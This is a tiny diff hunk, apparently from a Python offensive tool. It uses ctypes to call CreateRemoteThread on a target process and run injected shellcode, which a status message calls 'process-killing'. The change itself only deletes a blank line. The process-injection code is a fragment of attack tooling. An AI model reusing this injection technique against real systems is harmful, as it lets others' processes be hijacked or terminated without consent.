@@ -32,5 +32,4 @@
         thread_id = c_ulong(0)
         if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(thread_id)):
             return "[*] Failed to inject process-killing shellcode. Exiting."
-
         return "[*] Remote thread created."
